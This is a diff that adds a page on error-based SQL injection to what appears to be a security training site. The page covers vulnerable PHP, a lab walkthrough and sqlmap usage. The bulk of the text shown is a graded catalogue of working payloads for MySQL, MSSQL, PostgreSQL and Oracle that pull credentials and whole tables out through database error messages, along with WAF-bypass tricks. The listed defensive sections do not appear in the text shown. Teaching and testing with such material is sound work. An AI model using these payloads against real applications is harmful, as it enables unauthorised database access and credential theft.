@@ -278,6 +278,7 @@ var PAGE_UPDATED = {
   'tools':                {date: '2026-03-23', version: 'v0.1.0'},
   'labs':                 {date: '2026-03-23', version: 'v0.1.0'},
   'sqli-classic-inband':  {date: '2026-03-24', version: 'v1.0.0'},
+  'sqli-error-based':     {date: '2026-03-24', version: 'v1.0.0'},
   'sqli-blind-boolean':   {date: '2026-03-24', version: 'v1.0.0'}
 };
 
@@ -3297,6 +3298,1904 @@ switch(param) {
 \`\`\`
 `;
 
+
+PAGES.sqli_error_based = `<p>
+<span style="background:#d32f2f;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CRITICAL</span>&nbsp;
+<span style="background:#f57c00;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CWE-89</span>&nbsp;
+<span style="background:#e65100;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CWE-209</span>&nbsp;
+<span style="background:#7b1fa2;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CAPEC-7</span>&nbsp;
+<span style="background:#d32f2f;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CVSS 9.8</span>&nbsp;
+<span style="background:#1565c0;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">OWASP A05:2025</span>
+</p>
+
+# Error-Based SQL Injection
+
+**CAT-01 > SQL Injection > Error-Based**
+
+---
+
+## Table of Contents
+
+1. [Overview](#overview)
+2. [Understanding From Zero](#understanding-from-zero)
+3. [Attack Surface Identification](#attack-surface-identification)
+4. [How It Works](#how-it-works)
+5. [Detection and Validation](#detection-and-validation)
+6. [Beginner Lab Walkthrough](#beginner-lab-walkthrough)
+7. [Techniques](#techniques)
+8. [Tactics (MITRE ATT&CK)](#tactics-mitre-attck)
+9. [Tools](#tools)
+10. [Payload Crafting](#payload-crafting)
+11. [Exploitation](#exploitation)
+12. [Post-Exploitation](#post-exploitation)
+13. [Detection Evasion](#detection-evasion)
+14. [Variations and Edge Cases](#variations-and-edge-cases)
+15. [Modern Stack Specifics](#modern-stack-specifics)
+16. [Real-World Examples](#real-world-examples)
+17. [Skill Progression Path](#skill-progression-path)
+18. [Defensive Countermeasures](#defensive-countermeasures)
+19. [References](#references)
+20. [AI Agent Metadata](#ai-agent-metadata)
+
+---
+
+## Overview
+
+Error-based SQL injection is a data exfiltration technique where the attacker forces the database to produce error messages that contain the results of injected subqueries. The database error message itself is the data channel. Instead of reading query results from a normal page output (as in classic in-band SQLi) or from an appended UNION SELECT (as in union-based), the attacker constructs a subquery inside a function that is designed to fail, and the resulting error text embeds the subquery's return value. The attacker reads the extracted data directly from the error string rendered in the HTTP response, an API error field, an HTML comment, or a JavaScript snippet.
+
+The mechanism relies on a two-part chain. First, CWE-89 (Improper Neutralization of Special Elements used in an SQL Command) must be present: the application concatenates user input into a SQL query without parameterization, allowing the attacker to inject arbitrary SQL syntax. Second, CWE-209 (Generation of Error Message Containing Sensitive Information) must be present: the application returns verbose database error messages to the user rather than a generic error page. Without CWE-209, the error messages never reach the attacker and the technique fails -- though the underlying injection vulnerability remains exploitable via blind or time-based methods.
+
+Error-based SQLi encompasses two distinct sub-techniques that operate on fundamentally different data channels:
+
+**Direct error extraction** forces a function call that always fails, and the failure message contains the queried data verbatim. For example, \`CAST((SELECT password FROM users LIMIT 1) AS int)\` on PostgreSQL produces \`ERROR: invalid input syntax for type integer: "s3cr3t_p4ssw0rd"\`. The password appears directly in the error text. One HTTP request extracts many characters at once, limited only by the error function's output capacity (32 characters for MySQL EXTRACTVALUE, up to 8000 for MSSQL CONVERT). This is fast -- comparable in speed to UNION-based extraction.
+
+**Conditional error oracle** uses \`CASE WHEN\` expressions to control whether an error occurs. If a boolean condition is true, a division-by-zero or overflow triggers an error. If false, no error occurs. The attacker observes the binary signal (error vs. no-error, typically HTTP 500 vs. HTTP 200) and infers data one bit at a time through iterative character-by-character extraction with binary search. This is slow -- requiring approximately 7 requests per character -- but works even when the application returns generic error pages without database error detail, as long as any observable behavioral difference exists between error and non-error states.
+
+The distinction matters for exploitation strategy: direct error extraction is preferred when verbose errors are visible (fast, minimal request count), while the conditional error oracle is the fallback when error messages are suppressed but error states are still detectable (slower, but works through custom error pages). Both techniques share the same root cause (SQL injection plus error exposure) and the same remediation path (parameterized queries plus error suppression), but they operate at different speeds and have different detection profiles.
+
+Error-based SQLi is classified under CWE-89 (SQL Injection) as the injection mechanism and CWE-209 (Error Message Information Disclosure) as the enabling condition. CAPEC-7 covers the error oracle variant. OWASP maps it to A05:2025 (Security Misconfiguration, covering verbose error messages) in addition to A03:2021 (Injection). CVSS base scores for exploitable error-based SQLi consistently reach 9.8 Critical when unauthenticated, as demonstrated by CVE-2023-34362 (MOVEit Transfer, 9.8), CVE-2024-1071 (Ultimate Member, 9.8), CVE-2024-42005 (Django, 9.8 CISA-ADP), and CVE-2023-48788 (FortiClient EMS, 9.8).
+
+---
+
+## Understanding From Zero
+
+### Analogy
+
+Imagine you walk into a library and ask the librarian: "Please find me the book titled \`CAST((SELECT secret_diary FROM vault) AS integer)\`." The librarian does not understand what you asked for -- it is not a valid book title -- so she starts to explain the error. But instead of simply saying "Not found," she reads back exactly what she tried to look up: "I could not convert 'Dear Diary, the combination is 41-23-07' to an integer shelf number." She accidentally read out the entire content of the secret diary while explaining why your request was invalid. The error message contains the answer.
+
+That is error-based SQL injection. You ask the database a deliberately malformed question. The database tries to process it, fails, and in explaining the failure, reveals the data you were after. The error message IS the extraction channel.
+
+### Vulnerable Code
+
+\`\`\`php
+// PHP: user input concatenated into query, errors displayed
+$id = $_GET['id'];
+$query = "SELECT * FROM products WHERE id = " . $id;
+$result = mysqli_query($conn, $query);
+if (!$result) {
+    echo "Database error: " . mysqli_error($conn);  // CWE-209: error exposed to user
+}
+\`\`\`
+
+### What the Attacker Submits
+
+\`\`\`
+GET /product?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))
+\`\`\`
+
+### What the Database Executes
+
+\`\`\`sql
+SELECT * FROM products WHERE id = 1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1)))
+\`\`\`
+
+The \`EXTRACTVALUE\` function expects a valid XPath expression. \`CONCAT(0x7e, 's3cr3t_p4ssw0rd')\` produces \`~s3cr3t_p4ssw0rd\`, which is not valid XPath. MySQL generates:
+
+\`\`\`
+XPATH syntax error: '~s3cr3t_p4ssw0rd'
+\`\`\`
+
+The application displays this error to the user. The password is now visible.
+
+### Why the Application Shows Errors
+
+Applications display raw database errors because of:
+
+1. **Development configuration left in production** -- \`display_errors = On\` in PHP, \`DEBUG = True\` in Django, \`<customErrors mode="Off"/>\` in ASP.NET
+2. **Catch blocks that expose exception messages** -- \`catch (SQLException e) { response.getWriter().println(e.getMessage()); }\`
+3. **Framework default behavior** -- many frameworks show detailed errors in development mode, and developers forget to switch to production mode
+4. **API responses with error detail** -- JSON APIs often include \`{"error": "SQL error: ..."}\` fields containing raw database output
+5. **Error messages hidden in HTML comments or JavaScript** -- not visible on the rendered page but present in the response source
+
+### Concrete Impacts
+
+| Impact | How Error-Based SQLi Achieves It |
+|--------|----------------------------------|
+| **Full database extraction** | Direct error functions leak credentials, PII, financial data, session tokens -- one value per request |
+| **Schema discovery** | Error messages reveal table names, column names, database version, server name |
+| **Authentication bypass** | Extract admin password hashes, then crack them offline |
+| **Privilege escalation** | Extract database admin credentials, API keys, or encryption keys stored in DB |
+| **Remote code execution** | Chain with stacked queries for \`xp_cmdshell\` (MSSQL) or \`INTO OUTFILE\` (MySQL) |
+| **Lateral movement** | Extracted credentials for database accounts often reused across systems |
+
+---
+
+## Attack Surface Identification
+
+### Primary Injection Points
+
+| Vector | Example | Risk Level |
+|--------|---------|------------|
+| URL query parameter | \`?id=1\`, \`?product=42\`, \`?category=3\` | High |
+| POST body field | \`username=admin\`, \`login_email=test@test.com\` | High |
+| Cookie value | \`Cookie: TrackingId=abc123; session=xyz\` | High |
+| HTTP header | \`User-Agent\`, \`Referer\`, \`X-Forwarded-For\` | Medium-High |
+| REST API parameter | \`/api/v1/users/123\`, JSON body \`{"user_id": 1}\` | High |
+| Sort/order parameter | \`?sort=name&dir=asc\` | Medium |
+| Search/filter field | \`?q=keyword\`, \`?filter[status]=active\` | High |
+| XML/SOAP body | \`<productId>1</productId>\` | Medium |
+| GraphQL argument | \`query { user(id: "1") { name } }\` | Medium-High |
+
+### Error Exposure Points
+
+Error messages may appear in locations beyond the obvious response body:
+
+- **HTTP response body** -- the most common; raw error string in the HTML
+- **HTML source comments** -- \`<!-- Error: XPATH syntax error: '~admin~' -->\` hidden from visual rendering
+- **JavaScript variables** -- \`var error = "Conversion failed when converting..."\` in embedded scripts
+- **JSON API error fields** -- \`{"status": "error", "message": "invalid input syntax for integer: 'admin'"}\` in API responses
+- **HTTP response headers** -- \`X-Debug-Error: ORA-292257: host SCOTT unknown\` in custom headers
+- **Server log files** -- accessible via path traversal, LFI, or misconfigured log viewers
+- **Framework debug pages** -- Django debug page, Laravel Ignition, ASP.NET Yellow Screen of Death
+
+### Signals That Error-Based Extraction Is Possible
+
+1. Submitting a single quote (\`'\`) returns a database error message containing SQL syntax details
+2. Submitting a string where a number is expected triggers a type conversion error with the original value visible
+3. The HTTP response code changes from 200 to 500 when SQL syntax is broken
+4. Error pages contain database-specific keywords: \`MySQL\`, \`ORA-\`, \`Conversion failed\`, \`ERROR: invalid input syntax\`, \`XPATH syntax error\`
+5. Submitting \`AND 1=1\` behaves normally while \`AND 1=2\` behaves differently (confirms injection exists)
+
+---
+
+## How It Works
+
+### Mechanism Flow
+
+\`\`\`mermaid
+sequenceDiagram
+    participant A as Attacker
+    participant W as Web Application
+    participant D as Database
+
+    A->>W: Inject subquery inside error function<br/>id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))
+    W->>D: Execute modified SQL query
+    D->>D: Evaluate subquery: SELECT user() = 'root@localhost'
+    D->>D: EXTRACTVALUE tries XPath: '~root@localhost'
+    D->>D: XPath parsing FAILS (invalid expression)
+    D-->>W: Error: "XPATH syntax error: '~root@localhost'"
+    W-->>A: HTTP response contains error message
+    A->>A: Read 'root@localhost' from error text
+\`\`\`
+
+### Direct Error Extraction Flow (Data IN the Error)
+
+\`\`\`
+1. Attacker crafts payload:    AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))
+2. Database evaluates subquery: SELECT password FROM users LIMIT 1  -->  "s3cr3t"
+3. CONCAT produces:             "~s3cr3t"
+4. EXTRACTVALUE tries XPath:    EXTRACTVALUE(1, "~s3cr3t")  -->  FAILS (invalid XPath)
+5. Error message generated:     "XPATH syntax error: '~s3cr3t'"
+6. Application sends error:     HTTP 500 with error message in response body
+7. Attacker reads:              "s3cr3t" directly from the error text
+\`\`\`
+
+### Conditional Error Oracle Flow (Error/No-Error as Boolean Signal)
+
+\`\`\`
+1. Attacker crafts payload:    AND CASE WHEN (SUBSTR(password,1,1)='s') THEN TO_CHAR(1/0) ELSE '' END
+2. Database evaluates SUBSTR:   First char of password = 's' --> condition is TRUE
+3. THEN branch executes:        TO_CHAR(1/0) --> division by zero --> ORA-01476 error
+4. Application returns:         HTTP 500 (error state)
+5. Attacker concludes:          First character IS 's'
+
+Next request:
+1. Attacker changes test:      AND CASE WHEN (SUBSTR(password,1,1)='t') THEN TO_CHAR(1/0) ELSE '' END
+2. Database evaluates:          First char = 's', not 't' --> condition is FALSE
+3. ELSE branch executes:        '' --> no error
+4. Application returns:         HTTP 200 (normal state)
+5. Attacker concludes:          First character is NOT 't'
+\`\`\`
+
+---
+
+## Detection and Validation
+
+### Step 1: Identify Injection Point
+
+Submit values that break SQL syntax and observe the response.
+
+| Probe | Expected Response (if vulnerable) |
+|-------|-----------------------------------|
+| \`'\` | Database error mentioning unclosed quote or syntax error |
+| \`''\` | No error (escaped quote; confirms string context) |
+| \`1/0\` | Division by zero error (numeric context) |
+| \`1 AND 1=1\` | Normal response |
+| \`1 AND 1=2\` | Different response (confirms boolean evaluation) |
+
+### Step 2: Fingerprint the Database via Error Messages
+
+Each database produces distinctive error signatures:
+
+**MySQL:**
+\`\`\`
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+\`\`\`
+
+**MSSQL:**
+\`\`\`
+Conversion failed when converting the nvarchar value '...' to data type int.
+Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
+\`\`\`
+
+**PostgreSQL:**
+\`\`\`
+ERROR: invalid input syntax for type integer: "..."
+ERROR: unterminated quoted string at or near "'"
+\`\`\`
+
+**Oracle:**
+\`\`\`
+ORA-00933: SQL command not properly ended
+ORA-01756: quoted string not properly terminated
+ORA-19202: Error occurred in XML processing
+ORA-292257: host ... unknown
+\`\`\`
+
+**SQLite:**
+\`\`\`
+near "...": syntax error
+\`\`\`
+
+### Step 3: Confirm Error-Based Extraction
+
+Test with a simple error function to verify data appears in the error message:
+
+\`\`\`sql
+-- MySQL
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))
+-- Expected: XPATH syntax error: '~5.7.33~'
+
+-- MSSQL
+AND 1=CONVERT(int,@@version)
+-- Expected: Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int.
+
+-- PostgreSQL
+AND 1=CAST((SELECT version()) AS int)
+-- Expected: invalid input syntax for type integer: "PostgreSQL 16.2..."
+
+-- Oracle
+AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1))
+-- Expected: DRG-11701: thesaurus Oracle Database 11g... does not exist
+\`\`\`
+
+---
+
+## Beginner Lab Walkthrough
+
+### Lab: Visible Error-Based SQL Injection (PortSwigger -- PRACTITIONER)
+
+**URL:** https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based
+
+**Scenario:** The application uses a \`TrackingId\` cookie in SQL queries and displays verbose PostgreSQL error messages.
+
+**Target:** Extract the \`administrator\` password from the \`users\` table.
+
+**Step 1: Trigger an initial error to reveal query structure.**
+
+\`\`\`
+TrackingId=abc'
+\`\`\`
+
+The verbose error reveals: \`ERROR: unterminated quoted string at or near "'abc'"\` and shows the full query: \`SELECT * FROM tracking WHERE id = 'abc''\`.
+
+**Step 2: Close the syntax with a comment.**
+
+\`\`\`
+TrackingId=abc'--
+\`\`\`
+
+No error. The \`--\` comments out the trailing single quote.
+
+**Step 3: Introduce a CAST subquery.**
+
+\`\`\`
+TrackingId=abc' AND CAST((SELECT 1) AS int)--
+\`\`\`
+
+Error about boolean context -- the AND clause requires a boolean expression.
+
+**Step 4: Fix the boolean context.**
+
+\`\`\`
+TrackingId=abc' AND 1=CAST((SELECT 1) AS int)--
+\`\`\`
+
+No error. The CAST succeeds because \`1\` is already an integer.
+
+**Step 5: Target the username column.**
+
+\`\`\`
+TrackingId=abc' AND 1=CAST((SELECT username FROM users) AS int)--
+\`\`\`
+
+Error: subquery returns more than one row.
+
+**Step 6: Clear the cookie value and add LIMIT 1.**
+
+\`\`\`
+TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+\`\`\`
+
+Error message reveals: \`invalid input syntax for type integer: "administrator"\`.
+
+The username \`administrator\` is leaked directly in the error.
+
+**Step 7: Extract the password.**
+
+\`\`\`
+TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+\`\`\`
+
+Error message reveals: \`invalid input syntax for type integer: "wr80f3v2i..."\`.
+
+The password appears in the error. Log in as \`administrator\` with this password to solve the lab.
+
+### Free Alternatives
+
+- **DVWA (Damn Vulnerable Web Application)** -- Set security level to Low, use the SQL Injection page with verbose MySQL errors
+- **SQLi-labs by Audi-1** -- Lessons 5, 6 specifically cover error-based injection with EXTRACTVALUE and UPDATEXML
+- **HackTheBox Academy** -- SQL Injection Fundamentals module covers error-based techniques
+
+### Common Mistakes
+
+1. **Forgetting LIMIT 1** -- Subqueries that return multiple rows cause "subquery returns more than 1 row" errors instead of data extraction
+2. **Not clearing the original parameter value** -- Long cookie/parameter values plus the payload may exceed a character limit in the error output
+3. **Ignoring the 32-character limit** -- MySQL EXTRACTVALUE/UPDATEXML only show ~32 characters per error; use SUBSTRING for longer values
+4. **Wrong comment syntax for the database** -- \`--\` requires a trailing space in MySQL (\`-- \`), Oracle uses \`--\`, MSSQL accepts \`--\` or \`/* */\`
+
+---
+
+## Techniques
+
+### Level 0: Understanding Why Errors Contain Data
+
+The fundamental mechanism is that database error handlers are designed to be helpful to developers. When a function receives invalid input, the error message includes the invalid value to aid debugging. Error-based SQLi exploits this design by ensuring the "invalid value" is actually the result of an attacker-controlled subquery.
+
+Three categories of error triggers:
+
+1. **Type conversion errors** -- CAST/CONVERT a string value to an integer type. The error says "cannot convert 'THE_DATA' to integer." Works on MSSQL, PostgreSQL, MySQL (via XPath functions).
+2. **Function input validation errors** -- Functions expecting specific formats (UUID, XPath, GTID, GeoHash, JSON) reject non-conforming input and include the rejected value in the error message.
+3. **Arithmetic overflow errors** -- Expressions that exceed numeric type limits (BIGINT overflow, DOUBLE overflow, division by zero) produce errors containing the expression that caused the overflow.
+
+### Level 1: Basic EXTRACTVALUE/UPDATEXML (MySQL)
+
+**EXTRACTVALUE** and **UPDATEXML** are the two most common MySQL error-based functions. Both exploit XPath parsing errors. Available since MySQL 5.1, they are the first functions tested by sqlmap.
+
+\`\`\`sql
+-- EXTRACTVALUE: Invalid XPath triggers error containing the evaluated expression
+-- DB: MySQL >= 5.1 | Char limit: 32 | Error: XPATH syntax error
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))
+-- Output: XPATH syntax error: '~5.7.33~'
+
+-- UPDATEXML: Same mechanism via XML update function
+-- DB: MySQL >= 5.0 | Char limit: 32 | Error: XPATH syntax error
+AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)
+-- Output: XPATH syntax error: '~5.7.33~'
+\`\`\`
+
+The 32-character limit on XPath error output means longer values require chunked extraction (covered in Level 3).
+
+### Level 2: CAST/CONVERT (MSSQL, PostgreSQL) and Conditional Errors
+
+**MSSQL CAST/CONVERT** forces type conversion of a string to integer. The error includes the unconverted string.
+
+\`\`\`sql
+-- DB: MSSQL (all versions) | Char limit: ~8000 | Error: Conversion failed
+AND 1=CONVERT(int,@@version)
+-- Output: Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019...' to data type int.
+
+AND 1=CAST((SELECT TOP 1 username+':'+password FROM users) AS int)
+-- Output: Conversion failed when converting the nvarchar value 'admin:s3cr3t' to data type int.
+\`\`\`
+
+**PostgreSQL CAST** operates identically:
+
+\`\`\`sql
+-- DB: PostgreSQL (all versions) | Char limit: ~256 | Error: invalid input syntax
+AND 1=CAST((SELECT version()) AS int)
+-- Output: ERROR: invalid input syntax for type integer: "PostgreSQL 16.2 on x86_64..."
+
+-- Shorthand :: operator (PostgreSQL-specific)
+AND (SELECT version())::int=1
+\`\`\`
+
+**Conditional errors** use CASE WHEN to create a boolean oracle:
+
+\`\`\`sql
+-- Oracle: TO_CHAR(1/0) triggers ORA-01476 when condition is true
+'||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+-- MSSQL: Direct 1/0
+SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN 1/0 ELSE NULL END FROM users WHERE username='administrator'
+
+-- PostgreSQL: 1/(SELECT 0) for division by zero
+1=(SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN 1/(SELECT 0) ELSE NULL END)
+
+-- MySQL: Multi-row subquery in scalar context
+AND (SELECT IF(SUBSTRING(user(),1,1)='r',(SELECT table_name FROM information_schema.tables),'a'))
+\`\`\`
+
+### Level 3: FLOOR+RAND+GROUP BY, Oracle XMLType, Character Limit Bypass
+
+**FLOOR(RAND(0)*2) with GROUP BY** is the classic MySQL double-query technique, available since MySQL 4.1 with a ~64 character output limit:
+
+\`\`\`sql
+-- DB: MySQL >= 4.1 | Char limit: ~64 | Error: Duplicate entry
+AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
+-- Output: Duplicate entry '~5.7.33~1' for key 'group_key'
+\`\`\`
+
+This works because \`FLOOR(RAND(0)*2)\` produces a deterministic sequence (0,1,1,0,1,1...) and is evaluated twice per row -- once for GROUP BY check, once for insertion -- causing a duplicate key. The source table must have at least 3 rows (\`information_schema.tables\` is reliable).
+
+**Oracle XMLType** forces XML parsing errors:
+
+\`\`\`sql
+-- DB: Oracle 9i+ | Char limit: ~70 (standard) / 162 (base64) | Error: LPX-00234
+AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(REPLACE((SELECT banner FROM v$version WHERE ROWNUM=1),' ','_'))||'~'||CHR(62))) FROM DUAL)
+-- Output: LPX-00234: namespace prefix "~Oracle_Database_11g~" is not declared
+\`\`\`
+
+**Oracle CTXSYS.DRITHSX.SN** (requires Oracle Text):
+
+\`\`\`sql
+-- DB: Oracle 10g+ | Char limit: ~4000 | Error: DRG-11701
+AND 1=CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1))
+-- Output: DRG-11701: thesaurus Oracle Database 11g Express Edition does not exist
+\`\`\`
+
+**Character limit bypass via SUBSTRING chunking:**
+
+\`\`\`sql
+-- MySQL EXTRACTVALUE: extract in 31-char chunks (1 char consumed by 0x7e prefix)
+-- Chunk 1 (chars 1-31):
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,1,31) FROM users LIMIT 0,1)))
+-- Chunk 2 (chars 32-62):
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,32,31) FROM users LIMIT 0,1)))
+-- Chunk 3 (chars 63-93):
+AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT SUBSTRING(password,63,31) FROM users LIMIT 0,1)))
+\`\`\`
+
+### Level 4: BIGINT Overflow, EXP Overflow, GTID_SUBSET, JSON_KEYS, UUID_TO_BIN, DIOS
+
+These are higher-output alternatives to the 32-character XPath functions.
+
+**BIGINT overflow (~0 technique):**
+
+\`\`\`sql
+-- DB: MySQL >= 5.5.5 | Char limit: ~255 | Error: BIGINT value is out of range
+AND !(SELECT*FROM(SELECT CONCAT(0x7e,version(),0x7e))x)-~0
+-- Output: BIGINT value is out of range in '((not((select '~5.7.33~' from dual))) - ~(0))'
+\`\`\`
+
+Mathematical basis: \`~0\` = 18446744073709551615 (max unsigned BIGINT). The subquery evaluates to a string, \`!\` (logical NOT) converts it to 0, and \`0 - 18446744073709551615\` underflows the signed BIGINT range.
+
+**EXP() overflow:**
+
+\`\`\`sql
+-- DB: MySQL >= 5.5.5 | Char limit: ~255 | Error: DOUBLE value is out of range
+AND EXP(~(SELECT*FROM(SELECT version())x))
+-- Output: DOUBLE value is out of range in 'exp(~((select '5.7.33' from dual)))'
+\`\`\`
+
+**GTID_SUBSET (GTID parsing error):**
+
+\`\`\`sql
+-- DB: MySQL >= 5.6 | Char limit: ~200+ | Error: Malformed GTID set specification
+AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1337)
+-- Output: Malformed GTID set specification '~5.7.33~'
+\`\`\`
+
+**JSON_KEYS (JSON parsing error):**
+
+\`\`\`sql
+-- DB: MySQL >= 5.7.8 | Char limit: ~200+ | Error: Invalid JSON text
+AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version(),0x7e)) USING utf8)))
+-- Output: Invalid JSON text in argument 1 to function json_keys: "~5.7.33~"
+\`\`\`
+
+**UUID_TO_BIN / BIN_TO_UUID (MySQL 8.0+):**
+
+\`\`\`sql
+-- DB: MySQL >= 8.0 | Char limit: ~100+ | Error: Incorrect string value
+AND UUID_TO_BIN((SELECT @@version))
+-- Output: Incorrect string value: '8.0.32' for function uuid_to_bin
+
+OR BIN_TO_UUID((SELECT password FROM users LIMIT 0,1))='1'
+-- Output: Incorrect string value: 's3cr3t' for function bin_to_uuid
+\`\`\`
+
+**DIOS (Dump In One Shot) via BIGINT overflow:**
+
+\`\`\`sql
+-- DB: MySQL >= 5.5.5 | Dumps up to ~27 rows of schema::table::column
+AND !(SELECT*FROM(SELECT(CONCAT(@:=0,(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND @:=CONCAT(@,0x0a,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0
+\`\`\`
+
+### Level 5: Protocol-Level Techniques, WAFFLED Research, Geospatial Functions, Novel Techniques
+
+**Geospatial function errors (MySQL 5.7+, rarely WAF-blocked):**
+
+\`\`\`sql
+-- DB: MySQL >= 5.7.5 | Char limit: ~100+ | Error: Incorrect geohash value
+AND ST_LatFromGeoHash((SELECT @@version))
+-- Output: Incorrect geohash value: '5.7.33' for function ST_LATFROMGEOHASH
+
+AND ST_LongFromGeoHash((SELECT @@version))
+-- Output: Incorrect geohash value: '5.7.33' for function ST_LONGFROMGEOHASH
+
+AND ST_PointFromGeoHash((SELECT @@version),4326)
+AND ST_GeomFromGeoJSON((SELECT CONCAT(username,':',password) FROM users LIMIT 0,1))
+\`\`\`
+
+**Geometry functions (MySQL 5.1-5.5 only):**
+
+\`\`\`sql
+-- DB: MySQL 5.1-5.5 | Error: Illegal non geometric
+AND GEOMETRYCOLLECTION((SELECT*FROM(SELECT*FROM(SELECT @@version)a)b))
+AND MULTIPOINT((SELECT*FROM(SELECT*FROM(SELECT user())a)b))
+AND POLYGON((SELECT*FROM(SELECT*FROM(SELECT database())a)b))
+\`\`\`
+
+**JSON_TABLE error leaking (MySQL 8.0.4+):**
+
+\`\`\`sql
+AND EXISTS (SELECT * FROM JSON_TABLE(
+    (SELECT CONCAT('{"a":"',version(),'"}')),'$' COLUMNS (a INT PATH '$.a')) AS jt)
+\`\`\`
+
+**WAFFLED parsing discrepancy attacks (ACSAC 2025):** Exploit differences in how WAFs and backends parse HTTP requests. Send \`Content-Type: multipart/form-data\` with a URL-encoded body, use \`charset=ibm037\` encoding, or split payloads across chunked transfer-encoding boundaries. The WAF cannot reconstruct the payload, but the backend can.
+
+**PostgreSQL query_to_xml bulk extraction:**
+
+\`\`\`sql
+-- DB: PostgreSQL >= 8.3 | Char limit: entire result set | Dumps ALL rows
+AND 1=CAST(query_to_xml('SELECT * FROM users',true,true,'')::text AS int)
+\`\`\`
+
+**Oracle Base64-optimized XMLType (162 bytes per request):**
+
+\`\`\`sql
+SELECT ''||XMLType('<'||REGEXP_REPLACE(UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW((SELECT banner FROM v$version WHERE ROWNUM=1))))||':x>',CHR(10)||'|'||CHR(13)||'|=',''))||'' FROM DUAL
+\`\`\`
+
+**MSSQL FOR XML PATH / FOR JSON bulk extraction:**
+
+\`\`\`sql
+-- DB: MSSQL 2005+ | Char limit: entire result set
+AND 1=CAST((SELECT username+':'+password+'|' FROM users FOR XML PATH('')) AS int)
+
+-- DB: MSSQL 2016+ | JSON variant (WAF bypass)
+AND 1=CONVERT(int,(SELECT username,password FROM users FOR JSON PATH))
+\`\`\`
+
+---
+
+## Tactics (MITRE ATT&CK)
+
+| Tactic | Technique | ID | Description |
+|--------|-----------|-----|-------------|
+| Initial Access | Exploit Public-Facing Application | T1190 | SQL injection in web application parameters |
+| Collection | Data from Information Repositories | T1213 | Extracting credentials, PII, tokens from database via error messages |
+| Credential Access | Unsecured Credentials | T1552 | Database credentials leaked in error output |
+| Discovery | System Information Discovery | T1082 | Database version, server name, OS via @@version / v$version |
+| Discovery | Account Discovery | T1087 | Enumerating database users, roles, privileges |
+| Defense Evasion | Indicator Removal | T1070 | Error-based extraction may leave fewer forensic artifacts than data-returning queries |
+| Privilege Escalation | Exploitation for Privilege Escalation | T1068 | Extracted DB admin credentials used for privilege escalation |
+| Lateral Movement | Use Alternate Authentication Material | T1550 | Extracted session tokens or API keys used for lateral access |
+
+---
+
+## Tools
+
+### sqlmap (Primary)
+
+sqlmap is the standard tool for error-based exploitation. The \`--technique=E\` flag restricts testing to error-based methods only.
+
+\`\`\`bash
+# Error-based only, specify DBMS
+sqlmap -u "http://target/page?id=1" --technique=E --dbms=mysql
+
+# Error-based with increased verbosity (see exact payloads)
+sqlmap -u "http://target/page?id=1" --technique=E -v3
+
+# Error-based against cookie parameter
+sqlmap -u "http://target/page" --cookie="TrackingId=abc*" --technique=E
+
+# Dump specific table via error-based
+sqlmap -u "http://target/page?id=1" --technique=E -D database -T users --dump
+
+# Increase level for more error functions (GTID_SUBSET, BIGINT, etc.)
+sqlmap -u "http://target/page?id=1" --technique=E --level=5 --risk=3
+\`\`\`
+
+**sqlmap error-based function usage by level:**
+
+| Level | Functions Tested |
+|-------|------------------|
+| 1 | EXTRACTVALUE, UPDATEXML, CONVERT, CAST, XMLType, UTL_INADDR |
+| 2 | GTID_SUBSET, CTXSYS.DRITHSX.SN, IN clause, CONCAT, DBMS_UTILITY |
+| 3 | All Level 1-2 in HAVING, ORDER BY, GROUP BY clauses |
+| 4 | BIGINT overflow, EXP, JSON_KEYS |
+| 5 | FLOOR+RAND, ROW comparison, GENERATE_SERIES, NAME_CONST |
+
+**sqlmap source files:**
+- Payloads: \`data/xml/payloads/error_based.xml\`
+- Implementation: \`lib/techniques/error/use.py\`
+- Detection: \`lib/controller/checks.py\`
+
+### Burp Suite
+
+- **Intruder:** Automate conditional error oracle extraction (Cluster Bomb with character positions and character values as payloads)
+- **Repeater:** Manually test error-based payloads and observe error messages
+- **Scanner:** Passive scanning detects verbose database errors in responses; active scanning tests common error-based vectors
